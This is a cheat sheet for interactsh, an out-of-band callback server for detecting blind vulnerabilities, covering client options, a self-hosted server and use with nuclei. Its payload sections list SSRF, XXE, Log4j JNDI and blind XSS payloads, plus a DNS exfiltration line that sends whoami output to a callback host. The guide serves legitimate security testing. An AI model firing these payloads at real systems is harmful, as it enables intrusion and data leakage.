# interactsh

> Out-of-band (OOB) interaction server for detecting blind vulnerabilities. ProjectDiscovery.

## Quickstart

```bash
# Start client (get unique URL)
interactsh-client

# With custom server
interactsh-client -s oast.fun

# One-liner for testing
interactsh-client -v 2>&1 | tee interactions.log

# Use the URL in payloads
# http://abc123.oast.fun
# abc123.oast.fun (DNS)
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| OOB testing | Detect vulns via external callbacks |
| Protocols | HTTP, DNS, SMTP, LDAP, FTP, SMB |
| Interaction | Any request to your unique URL |
| Correlation | Link interactions to payloads |

## Syntax

```text
# Client (generate URLs, receive interactions)
interactsh-client [options]

# Server (self-hosted)
interactsh-server [options]
```

## Client Options

### Connection

| Option | Description |
|--------|-------------|
| `-s <server>` | Interactsh server (default: oast.live) |
| `-token <t>` | Auth token |
| `-n <n>` | Number of URLs to generate |

### Output

| Option | Description |
|--------|-------------|
| `-o <file>` | Output file |
| `-json` | JSON output |
| `-v` | Verbose |
| `-ps` | Poll immediately on start |

### Session

| Option | Description |
|--------|-------------|
| `-sf <file>` | Session file (persist URLs) |

### Filters

| Option | Description |
|--------|-------------|
| `-dns-only` | DNS interactions only |
| `-http-only` | HTTP interactions only |

## Recipes

### Basic Usage

```bash
# Start client
interactsh-client

# Output:
# [INF] Listing 1 payload for OOB Testing
# abc123.oast.live

# Now use abc123.oast.live in your payloads
# The client will show any callbacks
```

### Testing Blind Vulnerabilities

```bash
# Start client in terminal
interactsh-client -v

# Blind SSRF test
curl "https://target.com/fetch?url=http://abc123.oast.live"

# Blind XXE
# <?xml version="1.0"?>
# <!DOCTYPE foo [
#   <!ENTITY xxe SYSTEM "http://abc123.oast.live/xxe">
# ]>
# <foo>&xxe;</foo>

# Blind RCE (Linux)
# curl http://abc123.oast.live/rce

# Blind RCE (Windows)
# nslookup abc123.oast.live

# DNS exfil
# nslookup $(whoami).abc123.oast.live
```

### Payload Examples

```bash
# HTTP callback
http://abc123.oast.live/test

# DNS callback
abc123.oast.live

# DNS with data exfil
$(whoami).abc123.oast.live

# LDAP (Log4j)
${jndi:ldap://abc123.oast.live/a}

# Blind XSS
<img src=http://abc123.oast.live/xss>

# SSRF
http://abc123.oast.live/ssrf?target=internal
```

### Custom Server

```bash
# Use specific server
interactsh-client -s oast.fun
interactsh-client -s oast.me
interactsh-client -s interact.sh

# Self-hosted server
interactsh-client -s your-interactsh.com -token YOUR_TOKEN
```

### Session Persistence

```bash
# Save session (reuse same URLs)
interactsh-client -sf session.yaml

# Resume session
interactsh-client -sf session.yaml
```

### Integration with nuclei

```bash
# nuclei auto-uses interactsh for OOB templates
nuclei -l urls.txt -t cves/

# Specify interactsh server
nuclei -l urls.txt -iserver oast.fun

# Disable interactsh
nuclei -l urls.txt -ni
```

### Filtering Interactions

```bash
# DNS only
interactsh-client -dns-only

# HTTP only
interactsh-client -http-only
```

### Multiple URLs

```bash
# Generate multiple unique URLs
interactsh-client -n 5

# Each URL is unique - use different ones for different injection points
```

## Server (Self-Hosted)

```bash
# Install
go install github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest

# Run server
interactsh-server -domain oast.yourdomain.com

# With auth token
interactsh-server -domain oast.yourdomain.com -token YOUR_SECRET

# DNS setup required:
# A record: oast.yourdomain.com -> your-server-ip
# NS record: oast.yourdomain.com -> oast.yourdomain.com
```

## Output & Parsing

```bash
# JSON output
interactsh-client -json -o interactions.json

# Parse interactions
cat interactions.json | jq -r '.protocol + " " + .["remote-address"]'

# Log to file
interactsh-client -v 2>&1 | tee interactions.log
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No interactions | Check URL correct, firewall, DNS |
| Server unreachable | Try different server (-s oast.me) |
| DNS not resolving | Check network, try HTTP-only |
| Token error | Check token with server admin |

## References

- [interactsh GitHub](https://github.com/projectdiscovery/interactsh)
- [interactsh Docs](https://docs.projectdiscovery.io/tools/interactsh/overview)
- [Public Servers](https://app.interactsh.com/)
